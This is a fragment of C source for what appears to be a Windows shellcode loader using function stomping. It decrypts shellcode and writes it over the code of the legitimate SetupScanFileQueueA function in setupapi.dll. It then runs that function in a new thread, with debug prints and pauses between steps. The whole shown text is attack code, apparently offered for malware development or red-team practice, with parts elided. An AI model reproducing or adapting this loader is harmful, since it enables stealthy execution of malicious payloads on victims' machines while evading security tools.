...
#pragma comment(lib, "Setupapi.lib") // Adding "setupapi.dll" to the IAT
...
int main() {
    ...
    //Debug output for decrypted shellcode
    printf("\n[i] First 8 bytes of decrypted shellcode: ");
    for (int i = 0; i < 8 && i < sPlainTextSize; i++) {
        printf("%02X ", ((unsigned char*)pPlainText)[i]);
    }
    printf("\n");
    printf("[+] Address Of \"SetupScanFileQueueA\" : 0x%p \n", &SetupScanFileQueueA);

    // Write the payload to the function's memory
    printf("[#] Press <Enter> To Write Payload...\n");
    getchar();
    if (!WritePayload(&SetupScanFileQueueA, (PBYTE)pPlainText, sPlainTextSize)) {
        printf("\t[!] WritePayload Failed!\n");
    ...
    getchar();
    hThread = CreateThread(NULL, 0, &SetupScanFileQueueA, NULL, 0, NULL);
    if (hThread == NULL) {
